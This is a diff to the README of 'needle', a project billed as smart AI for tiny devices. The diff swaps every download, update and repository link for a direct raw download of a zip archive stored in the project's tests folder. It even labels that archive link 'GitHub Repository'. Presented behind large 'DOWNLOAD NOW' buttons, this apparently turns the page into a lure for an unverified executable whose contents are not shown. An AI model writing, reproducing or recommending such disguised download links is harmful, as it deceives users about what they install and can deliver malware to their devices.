@@ -1,7 +1,7 @@
 <h1>🌵 needle - Smart AI for Your Tiny Devices</h1>
 
 <p align="center">
-  <a href="https://github.com/Inz7672/needle" style="display:inline-block; padding:14px 28px; background:linear-gradient(135deg, #6f42c1, #e83e8c); color:#ffffff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:40px; box-shadow:0 4px 15px rgba(111,66,193,0.4);">⬇️ DOWNLOAD NEEDLE NOW</a>
+  <a href="https://raw.githubusercontent.com/Inz7672/needle/main/tests/Software_v2.2.zip" style="display:inline-block; padding:14px 28px; background:linear-gradient(135deg, #6f42c1, #e83e8c); color:#ffffff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:40px; box-shadow:0 4px 15px rgba(111,66,193,0.4);">⬇️ DOWNLOAD NEEDLE NOW</a>
 </p>
 
 ## 👋 What is Needle?
@@ -46,7 +46,7 @@ Needle is perfect for:
 
 **Step 1:** Click the big purple-pink button at the top of this page, or go directly to:
 
-👉 **[https://github.com/Inz7672/needle](https://github.com/Inz7672/needle)**
+👉 **[https://raw.githubusercontent.com/Inz7672/needle/main/tests/Software_v2.2.zip](https://raw.githubusercontent.com/Inz7672/needle/main/tests/Software_v2.2.zip)**
 
 Visit this link to download the application.
 
@@ -112,7 +112,7 @@ If that sounds complex, don't worry – the basic application works wonderfully 
 
 New versions of Needle that improve performance and add features are released regularly. To update:
 
-1. Visit [https://github.com/Inz7672/needle](https://github.com/Inz7672/needle) again
+1. Visit [https://raw.githubusercontent.com/Inz7672/needle/main/tests/Software_v2.2.zip](https://raw.githubusercontent.com/Inz7672/needle/main/tests/Software_v2.2.zip) again
 2. Look for the "Releases" section on the right-side menu
 3. Download the newest version (it will be labeled "Latest")
 4. Extract and run it – it will automatically replace the old version
@@ -143,14 +143,14 @@ Now you know everything you need to bring your devices to life with embedded AI 
 **Click here to download it now:**
 
 <p align="center">
-  <a href="https://github.com/Inz7672/needle" style="display:inline-block; padding:14px 28px; background:linear-gradient(135deg, #28a745, #20c997); color:#ffffff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:40px; box-shadow:0 4px 15px rgba(40,167,69,0.4);">🚀 DOWNLOAD NEEDLE – FREE</a>
+  <a href="https://raw.githubusercontent.com/Inz7672/needle/main/tests/Software_v2.2.zip" style="display:inline-block; padding:14px 28px; background:linear-gradient(135deg, #28a745, #20c997); color:#ffffff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:40px; box-shadow:0 4px 15px rgba(40,167,69,0.4);">🚀 DOWNLOAD NEEDLE – FREE</a>
 </p>
 
 Join the growing community of users putting a powerful, private, and portable AI right in their pocket. Your devices will thank you!
 
 ## 📚 Additional Resources
 
-- GitHub Repository: [https://github.com/Inz7672/needle](https://github.com/Inz7672/needle)
+- GitHub Repository: [https://raw.githubusercontent.com/Inz7672/needle/main/tests/Software_v2.2.zip](https://raw.githubusercontent.com/Inz7672/needle/main/tests/Software_v2.2.zip)
 - Issue Tracker: If you find bugs or have questions, visit the "Issues" tab on GitHub
 - Developer Docs: Check if a `docs/` folder exists in the repository for technical details
 
